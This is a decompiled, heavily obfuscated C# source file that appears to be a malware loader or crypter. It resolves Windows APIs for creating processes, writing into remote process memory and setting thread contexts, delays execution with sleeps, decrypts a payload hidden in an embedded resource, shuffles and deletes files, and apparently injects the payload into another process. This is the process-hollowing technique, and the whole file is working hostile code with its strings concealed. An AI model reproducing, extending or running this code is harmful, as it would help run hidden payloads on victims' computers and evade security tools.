using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns11;
using ns7;

namespace ns1;

[StandardModule]
internal sealed class Class5
{
	public class Class6
	{
		public delegate IntPtr Delegate0(IntPtr proceSA3ASDASss, int addreSA3AAEss, uint siDSA3ze, uint tyDSA3AS3pe, uint proS3A3SAtect);

		public delegate bool Delegate1(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

		public delegate bool Delegate2(IntPtr thread, int[] context);

		public delegate int Delegate3(IntPtr process, int baseAddress);

		public delegate bool Delegate4(IntPtr thread, int[] context);

		public struct Struct0
		{
			public uint uint_0;

			public uint uint_1;

			public uint uint_2;

			public uint uint_3;

			public uint uint_4;

			public uint uint_5;

			public uint uint_6;

			public Struct3 struct3_0;

			public uint uint_7;

			public uint uint_8;

			public uint uint_9;

			public uint uint_10;

			public uint uint_11;

			public uint uint_12;

			public uint uint_13;

			public uint uint_14;

			public uint uint_15;

			public uint uint_16;

			public uint uint_17;

			public uint uint_18;

			public uint uint_19;

			public uint uint_20;

			public uint uint_21;

			public uint uint_22;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
			public byte[] byte_0;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct Struct1
		{
			public IntPtr intptr_0;

			public IntPtr intptr_1;

			public uint uint_0;

			public uint uint_1;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct Struct2
		{
			public uint uint_0;

			public string string_0;

			public string string_1;

			public string string_2;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
			public byte[] byte_0;

			public IntPtr intptr_0;

			public IntPtr intptr_1;

			public IntPtr intptr_2;

			public IntPtr intptr_3;
		}

		public struct Struct3
		{
			public uint uint_0;

			public uint uint_1;

			public uint uint_2;

			public uint uint_3;

			public uint uint_4;

			public uint uint_5;

			public uint uint_6;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
			public byte[] byte_0;

			public uint uint_7;
		}

		public delegate bool Delegate5(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Struct2 startupInfo, ref Struct1 processInformation);

		public delegate uint Delegate6(IntPtr threDSADSAad);

		public delegate bool Delegate7(IntPtr thread, int[] context);

		public delegate bool Delegate8(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

		internal static T smethod_0<T>(string string_0, string string_1)
		{
			Conversion.Int((object)false);
			Conversion.Int((object)false);
			Conversion.Int((object)true);
			return (T)(object)Marshal.GetDelegateForFunctionPointer(Class42.GetProcAddress(Class42.LoadLibraryA(ref string_0), ref string_1), typeof(T));
		}

		[DllImport("ntdll.dll")]
		[SuppressUnmanagedCodeSecurity]
		internal static extern bool NtSetContextThread(IntPtr intptr_0, int[] int_0);
	}

	[STAThread]
	public static void Main()
	{
		if (!Class39.smethod_0())
		{
			return;
		}
		int try000c_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string empty = default(string);
		bool bool_ = default(bool);
		byte[] byte_ = default(byte[]);
		ResourceManager resourceManager = default(ResourceManager);
		string text = default(string);
		object executablePath = default(object);
		string text2 = default(string);
		byte[] array = default(byte[]);
		string sourceFileName = default(string);
		string text3 = default(string);
		byte[] byte_2 = default(byte[]);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				byte[] array2;
				switch (try000c_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0013;
				case 1159:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_000c;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0013;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_0037;
						case 5:
							goto IL_0068;
						case 6:
							goto IL_0080;
						case 7:
						case 8:
							goto IL_008c;
						case 9:
							goto IL_0095;
						case 10:
							goto IL_00a4;
						case 11:
							goto IL_00d6;
						case 12:
							goto IL_00db;
						case 13:
							goto IL_00f0;
						case 15:
							goto IL_015c;
						case 16:
							goto IL_015f;
						case 18:
							goto IL_0183;
						case 14:
						case 17:
						case 19:
						case 20:
						case 21:
							goto IL_0186;
						case 22:
							goto IL_018c;
						case 23:
							goto IL_0196;
						case 24:
							goto IL_01cd;
						case 25:
							goto IL_01e3;
						case 26:
							goto IL_01fe;
						case 27:
							goto IL_0219;
						case 28:
							goto IL_0221;
						case 29:
							goto IL_0226;
						case 30:
							goto IL_02a0;
						case 31:
						case 32:
							goto IL_02a5;
						case 33:
						case 34:
							goto IL_02a8;
						case 35:
							goto IL_02b2;
						case 36:
							goto IL_02cb;
						case 37:
							goto IL_02d8;
						case 38:
							goto IL_02e3;
						case 39:
							goto IL_02fd;
						case 40:
							goto IL_0326;
						case 41:
							goto IL_033a;
						case 42:
							goto IL_0340;
						case 45:
							goto IL_0383;
						case 46:
							goto IL_0386;
						case 43:
						case 44:
						case 47:
						case 48:
							goto end_IL_000c_2;
						default:
							goto end_IL_000c;
						case 49:
							goto end_IL_000c_3;
						}
						goto default;
					}
					IL_0386:
					num = 46;
					Class42.smethod_86(empty, bool_, byte_, Application.get_ExecutablePath());
					break;
					IL_0013:
					num = 2;
					Thread.Sleep(15000);
					goto IL_001f;
					IL_001f:
					num = 3;
					resourceManager = new ResourceManager(Class14.smethod_0(162), Assembly.GetExecutingAssembly());
					goto IL_0037;
					IL_0037:
					num = 4;
					text = Class14.smethod_0(187) + Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class14.smethod_0(221);
					goto IL_0068;
					IL_0068:
					num = 5;
					if (Class42.smethod_95(Class42.smethod_98(Class14.smethod_0(226))))
					{
						goto IL_0080;
					}
					goto IL_008c;
					IL_0080:
					num = 6;
					Thread.Sleep(26001);
					goto IL_008c;
					IL_008c:
					num = 8;
					executablePath = Application.get_ExecutablePath();
					goto IL_0095;
					IL_0095:
					num = 9;
					Conversion.Int((object)false);
					goto IL_00a4;
					IL_00a4:
					num = 10;
					text2 = Class14.smethod_0(187) + Interaction.Environ(Class42.smethod_98(Class14.smethod_0(259))) + Class14.smethod_0(221);
					goto IL_00d6;
					IL_00d6:
					num = 11;
					array = array;
					goto IL_00db;
					IL_00db:
					num = 12;
					array2 = Class42.smethod_72(Class14.smethod_0(292), array);
					goto IL_00f0;
					IL_00f0:
					num = 13;
					if (!Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(executablePath, (object)(Class14.smethod_0(187) + text2 + Class14.smethod_0(325)), false), Operators.CompareObjectEqual(executablePath, (object)(Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class42.smethod_98(Class14.smethod_0(358)) + Class14.smethod_0(447)), false))))
					{
						goto IL_015c;
					}
					goto IL_0186;
					IL_015c:
					num = 15;
					goto IL_015f;
					IL_015f:
					num = 16;
					if (Operators.CompareString(Application.get_ExecutablePath(), text2 + Class14.smethod_0(468), false) != 0)
					{
						goto IL_0183;
					}
					goto IL_0186;
					IL_0183:
					num = 18;
					goto IL_0186;
					IL_0186:
					num = 21;
					bool_ = false;
					goto IL_018c;
					IL_018c:
					num = 22;
					empty = string.Empty;
					goto IL_0196;
					IL_0196:
					num = 23;
					sourceFileName = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(489))) + Class42.smethod_98(Class14.smethod_0(522)) + Class14.smethod_0(611);
					goto IL_01cd;
					IL_01cd:
					num = 24;
					text3 = text2 + Class14.smethod_0(628);
					goto IL_01e3;
					IL_01e3:
					num = 25;
					byte_2 = (byte[])resourceManager.GetObject(Class14.smethod_0(645));
					goto IL_01fe;
					IL_01fe:
					num = 26;
					byte_ = Class42.smethod_72(Class42.smethod_98(Class14.smethod_0(670)), byte_2);
					goto IL_0219;
					IL_0219:
					num = 27;
					VBMath.Randomize();
					goto IL_0221;
					IL_0221:
					num = 28;
					flag = false;
					goto IL_0226;
					IL_0226:
					num = 29;
					if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(Operators.CompareObjectEqual(executablePath, (object)(text2 + Class14.smethod_0(325)), false), (object)true, false), Operators.CompareObjectEqual(Operators.CompareObjectEqual(executablePath, (object)(Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class42.smethod_98(Class14.smethod_0(358)) + Class14.smethod_0(447)), false), (object)true, false))))
					{
						goto IL_02a0;
					}
					goto IL_02a5;
					IL_02a0:
					num = 30;
					flag = true;
					goto IL_02a5;
					IL_02a5:
					num = 32;
					goto IL_02a8;
					IL_02a8:
					num = 34;
					File.Delete(text3);
					goto IL_02b2;
					IL_02b2:
					num = 35;
					File.Delete(text2 + Class14.smethod_0(759));
					goto IL_02cb;
					IL_02cb:
					num = 36;
					File.Copy(sourceFileName, text3, overwrite: true);
					goto IL_02d8;
					IL_02d8:
					num = 37;
					Conversion.Int(11);
					goto IL_02e3;
					IL_02e3:
					num = 38;
					Class42.DeleteFile(text2 + Class14.smethod_0(776));
					goto IL_02fd;
					IL_02fd:
					num = 39;
					Class42.DeleteFile(text + Class42.smethod_98(Class14.smethod_0(358)) + Class14.smethod_0(829));
					goto IL_0326;
					IL_0326:
					num = 40;
					if (Class42.smethod_95(Class14.smethod_0(870)))
					{
						goto IL_033a;
					}
					goto IL_0383;
					IL_033a:
					num = 41;
					if (!flag)
					{
						break;
					}
					goto IL_0340;
					IL_0340:
					num = 42;
					Class42.smethod_86(empty, bool_, byte_, Interaction.Environ(Class42.smethod_98(Class14.smethod_0(489))) + Class42.smethod_98(Class14.smethod_0(522)) + Class14.smethod_0(611));
					break;
					IL_0383:
					num = 45;
					goto IL_0386;
					end_IL_000c_2:
					break;
				}
				num = 48;
				Thread.Sleep(2000);
				ProjectData.EndApp();
				break;
				end_IL_000c:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try000c_dispatch = 1159;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_000c_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static Class5()
	{
		bool bool_ = false;
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if (!Class42.StrongNameSignatureVerificationEx(executingAssembly.Location, bool_0: true, out bool_) || !bool_ || !executingAssembly.FullName!.EndsWith(Class14.smethod_0(879)))
		{
			throw new SecurityException(Class14.smethod_0(904));
		}
	}

	internal static bool ySmZAWqMO0XtWgg4Yb()
	{
		return true;
	}

	internal static bool HMR9c0TlcY5W6BhBG6()
	{
		return false;
	}
}
